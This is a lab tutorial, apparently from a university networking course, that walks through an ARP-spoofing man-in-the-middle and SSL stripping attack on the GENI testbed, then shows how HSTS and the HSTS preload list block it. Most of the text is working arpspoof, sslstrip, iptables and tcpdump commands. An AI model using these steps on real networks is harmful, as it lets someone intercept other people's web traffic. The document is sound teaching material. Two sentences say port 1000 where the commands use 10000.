In this experiment, we will set up an SSL stripping attack on GENI and will demonstrate what the attack does to the encrypted communication between a client and a site. We will examine what information an “attacker” can see due to the attack and under what conditions the attack works.

It should take about thirty minutes to run this experiment.

To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). If you're not sure if you have those skills, you may want to try [Lab Zero](http://tinyurl.com/geni-labzero) first.

* Skip to [Results](#results)
* Skip to [Run my experiment](#run-my-experiment)

## Background
 
SSLstrip is an attack on HTTPS that allows an attacker to intercept the plaintext contents of an exchange that would normally be confidential. It involves two steps:

1. The attacker mounts an MITM (man-in-the-middle) attack so that traffic from the target device will be sent through the attacker.
2. When the target visits a website, the attacker acts a proxy, serving an HTTP (non-encrypted) version of the site to the target. Meanwhile, the attacker relays all of the target's actions on the site to the real destination over HTTPS.

The target can see that the connection is insecure, but does not know whether the connection should be secure. The website that the target visits believes the connection to be secure (since it sees an HTTPS connection to the proxy operated by the attacker).

[HSTS](https://https.cio.gov/hsts/) is a protocol that helps mitigate SSLstrip attacks. When a user first establishes an HTTPS connection to a site, the site sends back a header message that says "From now on, only connect to this site over HTTPS". That information is saved by the target's browser, and if in the future the browser sees that there is a request over HTTP, it will attempt to switch to HTTPS/or it won't connect.

## Results

In this experiment, an attacker is able to use SSLstrip to switch the normally encrypted-HTTPS traffic to unencrypted-HTTP traffic allowing the attacker to see all the contents of the communications between a client and the sites it accesses. 

Normally when we visit a site that supports HTTPS, we will be directed to the HTTPS version of the site. When there is an SSLstrip attack and we visit such a site, we will receive an HTTP version of the site. The following is an example of when there is an SSLstrip attack and we visit http://nj.gov.

**I have a recording**


We are able to see that we are served an HTTP version of the site. Check the upper-left corner in the address bar and you should not see an HTTPS indicator. The terminal is run on the attacker node and displays the captured HTTP content between the client and the site. There is a lot of content including the HTML of the webpage.

The following is an example of when the SSLstrip attack is disabled, but the attacker is still executing an MITM attack and we visit nj.gov.

**I have a recording**

We are able to verify that we are served the HTTPS version of the site. In the terminal, the captured HTTP content is displayed. This time, there is much less to display since the contents of the webpage are encrypted.

Websites that support HSTS are susceptible to SSLstrip when a connection is made for the first time. In the following example, we connect to http://nyu.edu which supports the HSTS protocol. There is an SSLstrip attack and this is the first connection.


![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/nyu_first_time.png)

In the following example, we connect to http://nyu.edu again. This time we have already established a secure connection and there is an SSLstrip attack. Notice that in this case, even with an SSLstrip attack, we will connect to the HTTPS version of the site

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/nyu_not_first_time.png)

Visiting a site on the HSTS preload list will always establish a secure connection. youtube.com is on the HTST preload list. In the following example, we connect to http://youtube.com for the first time during an SSLstrip attack.

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/youtube.png)



## Run my experiment

First, reserve your resources. You will need one publicly routable IP&mdash;if you are having trouble getting resources, you may use [this monitoring page](https://genimon.uky.edu/status) to find sites with publicly routable IPs available.

In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: https://raw.githubusercontent.com/esilver0/CATT/master/sslstrip_request_rspec.xml

This should load a topology onto your canvas, with a client, a router, and an attacker. The RSpec also includes commands to install necessary software on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources.

Wait for your nodes to boot up (they will turn green on the canvas display on your slice page in the GENI portal when they are ready). Then, wait another couple of minutes for the software installation to finish. Finally, use SSH to log in to each node in your topology (using the login details given in the GENI Portal).

### Open a browser on the client

To see what our "client" node sees when it browses the Internet, we'll need to be able to open a web browser on our client node. We will set up a VNC connection so that we can run graphical applications on the client.

On the client node, run

```
vncserver :0  
```

and enter a password (twice) when prompted. (Nothing will appear as you type the password.) **Choose "n"** when asked to enter a view-only password. After a few seconds and a few lines of output, you should be returned to your terminal prompt:

```
ffund01@client:~$ vncserver :0

You will require a password to access your desktops.

Password:  
Verify:  
Would you like to enter a view-only password (y/n)? n  
xauth:  file /users/ffund01/.Xauthority does not exist

New 'X' desktop is client.sslstrip.ch-geni-net.instageni.maxgigapop.net:0

Creating default startup script /users/ffund01/.vnc/xstartup  
Starting applications specified in /users/ffund01/.vnc/xstartup  
Log file is /users/ffund01/.vnc/client.sslstrip.ch-geni-net.instageni.maxgigapop.net:0.log  
```

Next, we will install a ["connector"](http://novnc.com/info.html) that will let us access this graphical interface from a web browser. On the "client" node, run

```
git clone git://github.com/kanaka/noVNC  
```

and then

<pre>
cd noVNC/
screen ./utils/launch.sh --vnc <b>client.sslstrip.ch-geni-net.instageni.maxgigapop.net</b>:5900
</pre>

where in place of the bold part above, you use the hostname shown for the "client" node in the GENI Portal.

After some more lines of output, you should see a URL, e.g.:

```
Navigate to this URL:

    http://client.sslstrip.ch-geni-net.instageni.maxgigapop.net:6080/vnc.html?host=client.sslstrip.ch-geni-net.instageni.maxgigapop.net&port=6080
``` 

If you press Ctrl‑C, rerun the command. To detach from or reattach to the screen, see [Notes](#notes).

Open this URL in a browser. (A recent version of Google Chrome is recommended.) Enter a password when prompted. Then, at the terminal, run

```
firefox  
```

and a browser window should come up.

This browser is running on the "client" node, _not_ on your own laptop. Leave this open&mdash;we will use it throughout our experiment.

> _**Note**: Some InstaGENI racks have a firewall in place that will block incoming traffic on the noVNC port. If everything looks normal in the terminal output but you haven't been able to open the URL in a browser, you might want to try using a different InstaGENI rack._



### Redirect traffic for remote site through router

In this experiment, we will attack an exchange between this client and several websites.

By default, if you visit https://witestlab.poly.edu in the Firefox browser that's running in NoVNC, traffic between the client and the website will go through the control interface on the client (that is used to log in to the client over SSH), not through the experiment interface. To demonstrate the SSLstrip attack, we'll want this traffic to go over the experiment network.

Open another SSH session to the client, and in it, run

```
sudo route add -host $(dig +short witestlab.poly.edu) gw 192.168.0.1
sudo route add -host $(dig +short nyu.edu) gw 192.168.0.1
sudo route add -host $(dig +short youtube.com) gw 192.168.0.1
sudo route add -host $(dig +short nj.gov) gw 192.168.0.1
```

to have traffic for the websites routed through the router on the experiment interface, 192.168.0.1. (When you run this command, the `$(dig +short witestlab.poly.edu)` variable will be filled in automatically with the actual IP address of the website&mdash;the `dig` command is used to resolve the hostname to its IP address.)

Then run 

```
route -n
```

and verify that these host-specific entries appear in the routing table. For example:

<pre>
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
128.238.66.220  192.168.0.1     255.255.255.255 UGH   0      0        0 eth1
172.217.4.110   192.168.0.1     255.255.255.255 UGH   0      0        0 eth1
199.20.100.8    192.168.0.1     255.255.255.255 UGH   0      0        0 eth1
216.165.47.10   192.168.0.1     255.255.255.255 UGH   0      0        0 eth1
</pre>

For return traffic to the client from the websites to reach the router, we'll also need to set up NAT on the router. Open an SSH session to the router node, and run

<pre>
sudo iptables -A FORWARD -o eth0 -i eth1 -s 192.168.0.0/24 -m conntrack --ctstate NEW -j ACCEPT  
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -t nat -F POSTROUTING  
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
</pre>

Here,

* The first rule tracks connections involving the 192.168.0.0/24 network, and makes sure that packets initiating a new connection are forwarded from the LAN to the WAN.
* The second rule allows forwarding of packets that are part of an established connection.
* The third and fourth rules actually do the network address translation. They will rewrite the source IP address in the Layer 3 header of packets forwarded out on the WAN interface. Also, when packets are received from the WAN, it identifies the connection that they belong to, rewrites the destination IP address in the Layer 3 headers, and forwards them on the LAN.


(For more details on how NAT works, see [this experiment](https://witestlab.poly.edu/blog/basic-home-gateway-services-dhcp-dns-nat/#nat).)

Also make sure that the router is forwarding traffic, by running

```
sudo sysctl -w net.ipv4.ip_forward=1
```

on the router node.

To make sure this all works as expected, on the router node run

```
sudo tcpdump -i eth1
```

and in the Firefox instance running in NoVNC, visit

http://witestlab.poly.edu

Make sure that the page loads, and make sure you can see exchange in your `tcpdump` window&mdash;this is how you know that traffic for this host is going through the router via the experiment network, and not through the control interface on the client. Once you have verified this, you can stop the `tcpdump` on the router.

You should also verify that the page is loaded over HTTPS — the browser will show a green padlock icon in the address bar to indicate that the connection is secure:

![](/blog/content/images/2018/03/sslstrip-no-attack.png)

Even though we didn't specify HTTPS in the address bar, the web server at witestlab.poly.edu is configured to use HTTPS for all connections, so the page will be loaded over HTTPS. 

### Execute the man-in-the-middle attack

We're now ready to carry out the attack. Open an SSH session to the attacker node.

Set up the attacker to forward traffic:

```
sudo sysctl -w net.ipv4.ip_forward=1
```

and to perform NAT:

```
sudo iptables -A FORWARD -o eth0 -i eth1 -s 192.168.0.0/24 -m conntrack --ctstate NEW -j ACCEPT  
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -t nat -F POSTROUTING  
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
```

Now, we're going to use ARP spoofing to get the client to send traffic through the attacker, instead of directly to the router. On the client node, check the client's ARP table with

```
arp -n -a -i eth1
```

You should see that the client has an entry for the router's IP address (192.168.0.1), with the router's MAC address. (Use `ifconfig eth1` on the router to verify its MAC address.) For example:

```
? (192.168.0.1) at 02:fb:83:fe:12:7e [ether] on eth1
```

Next, on the attacker, run

```
screen sudo arpspoof -i eth1 -t 192.168.0.2 192.168.0.1
```

to start the ARP spoofing. Re-run

```
arp -n -a -i eth1
```

on the client, and you should now see an entry for the router's IP address (192.168.0.1) but with the attacker's MAC address. For example:

```
? (192.168.0.99) at 02:ec:23:e9:fe:46 [ether] on eth1
? (192.168.0.1) at 02:ec:23:e9:fe:46 [ether] on eth1
```

Verify that the man-in-the-middle attack works. On the attacker node, run

```
sudo tcpdump -i eth1 tcp
```

and on the router node, also run

```
sudo tcpdump -i eth1 tcp
```

Finally, in the Firefox running in NoVNC, reload the web page at 

http://witestlab.poly.edu

Verify that the page loads (it should still be over HTTPS). You should see traffic in the `tcpdump` that runs on the attacker, but not on the `tcpdump` that runs on the router. Once you've verified this, you can stop both `tcpdump` instances.

### Execute the HTTPS stripping attack

Finally, we're ready to execute the HTTPS stripping part of the attack.

On the attacker node, run the following command:

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

This will redirect traffic from port 80 (the default web port for HTTP traffic) to port 1000, which is where the proxy will listen.

Then, on the attacker, run

```
screen sslstrip -l 10000
```

to start the SSL stripping proxy.

#### Visit a site for the first time

On the attacker node, run
```
sudo tcpdump -s 0 -i eth1 -A tcp port http
```
to display only HTTP packets. This will display the unencrypted communication between the client and the site that the attacker can see.


In the Firefox window where NoVNC is running, visit

http://nyu.edu

for the first time. You should verify that that the page loads over HTTP. 


The web server at nyu.edu is configured to use HTTPS for all connections. Therefore, if we stop SSlstrip before we visit nyu.edu, the page should load over HTTPS.

On an SSH session on the attacker, run

```
killall sslstrip
sudo iptables -t nat -D PREROUTING 1
```

to stop the SSL stripping proxy and stop redirecting traffic from port 80. 

Wait a minute, then run
```
sudo tcpdump -s 0 -i eth1 -A tcp port http
```
on the attacker. 

In the Firefox window where NoVNC is running, visit

http://nyu.edu.

Check that this time the connection is over HTTPS demonstrating that the SSLstrip attack works.

#### Visit a site that you have already established a secure connection with

On the attacker node, run

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
screen sslstrip -l 10000
```

to again redirect traffic from port 80 to port 1000 and restart the SSL stripping proxy. 

Wait a minute for SSLstrip to reconfigure. In the Firefox window where NoVNC is running, visit

http://nyu.edu

once more.

Verify that this time there is an HTTPS connection even though SSLstrip is enabled. HSTS prevented the SSLstrip attack by instructing the browser to not downgrade to HTTP since a secure connection had been established. 


*Optional: Once a site that supports HSTS has been visited with a secure connection, you can delete the history enabling SSLstrip to take effect. See [Delete HSTS history](#delete-hsts-history)*

#### Visit a site that does not support HSTS

Not all websites support HSTS. It is an opt-in protocol that requires proper configuration. First, the website has to support HTTPS. Second, the website has to include [HSTS response headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security).

On an SSH session on the attacker, run

```
killall sslstrip
sudo iptables -t nat -D PREROUTING 1
```

to disable the SSL stripping attack.

In the Firefox window where NoVNC is running, visit

http://nj.gov

for the first time. Verify the website supports HTTPS.

Then, on the attacker node run

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
screen sslstrip -l 10000
```
to enable the SSL stripping attack.


wait a minute, then run

```
sudo tcpdump -s 0 -i eth1 -A tcp port http
```

on the attacker to display the HTTP packets. 

In the Firefox window where NoVNC is running, visit

http://nj.gov

for the second time.

Verify that the connection is via HTTP even though a connection via HTTPS was already established.

> _**Note**: In the event that the connection is via HTTPS, it is possible that the website has since started supporting HSTS. Here is a [list of websites](https://pulse.cio.gov/https/domains/) with indication as to whether or not they support HTTPS, HSTS, etc. See [Expand the experiment](expand-the-experiment) to learn how to have traffic for the websites routed through the router on the experiment interface._


#### Visiting a site on the HSTS preload list


The browser will not accept an HTTP (insecure) request from any website on the [HSTS preload list](https://hg.mozilla.org/releases/mozilla-release/file/tip/security/manager/ssl/nsSTSPreloadList.inc) even if you are visiting the site for the first time. A site on the preload list must support HTTPS throughout its site and provide proper HSTS header messages.

In the Firefox window where NoVNC is running, visit

http://youtube.com

for the first time. 

Verify that there is an HTTPS connection and that youtube.com is on the [list](https://hg.mozilla.org/releases/mozilla-release/raw-file/tip/security/manager/ssl/nsSTSPreloadList.inc).

### Expand the experiment
To attempt this with other websites, run on the client

<pre>
sudo route add -host $(dig +short <b>website</b>) gw 192.168.0.1
</pre>
replacing the part in bold with the website. Then visit the site in the browser on the client.

If the result is similiar to

```
ers595@client:~$ sudo route add -host $(dig +short aol.com) gw 192.168.0.1
Usage: inet_route [-vF] del {-host|-net} Target[/prefix] [gw Gw] [metric M] [[dev] If]
       inet_route [-vF] add {-host|-net} Target[/prefix] [gw Gw] [metric M]
                              [netmask N] [mss Mss] [window W] [irtt I]
                              [mod] [dyn] [reinstate] [[dev] If]
       inet_route [-vF] add {-host|-net} Target[/prefix] [metric M] reject
       inet_route [-FC] flush      NOT supported
```

try running 
<pre>
dig +short <b>website</b>
</pre>
and see if you get multiple ip addresses. If that is the case, replace $(dig +short **website**) with the ip addresses.

For example

```
ers595@client:~$ dig +short aol.com
67.195.231.10
106.10.218.150
124.108.115.87
188.125.72.165
66.218.87.12
ers595@client:~$ sudo route add -host 67.195.231.10 gw 192.168.0.1
ers595@client:~$ sudo route add -host 106.10.218.150 gw 192.168.0.1
ers595@client:~$ sudo route add -host 124.108.115.87 gw 192.168.0.1
ers595@client:~$ sudo route add -host 188.125.72.165 gw 192.168.0.1
ers595@client:~$ sudo route add -host 66.218.87.12 gw 192.168.0.1
```

## Notes

### Detaching from and attaching to a screen

Press Ctrl‑A then Ctrl‑D to detach from a screen without terminating the process.
To reattach to a screen after detaching, run.
```
screen -r
```

If the SSH connection is lost, run

```
screen -Dr
```

### Delete HSTS history

**WARNING:** Make sure this is in the Firefox window where NoVNC is running. You want to delete HSTS history on the client, not on your computer.

In the firefox session enter

```
about:support
```

in the address bar on the client.

Copy the file location to the right of "Profile Directory" and "Open Directory". Then close all the tabs in the Firefox window where NoVNC is running. Or you could run in another "client" session, `killall firefox`.

Then run 

<pre>
nano <b>/users/ers595/.mozilla/firefox/70y24mrv.default</b>/SiteSecurityServiceState.txt
</pre>
replacing the part in bold with the file location.

*See WARNING above before proceeding* \
Clear any line containing the websites you want to remove.


Save the changes, then run

```
firefox
```

in the browser.

As far as HSTS is concerned, it is as if an HTTPS connection with the websites were never established in the first place. Keep in mind HSTS is still active&mdash;reconnecting with any of the websites via HTTPS will re-establish HSTS protection for those sites.

### Exercise
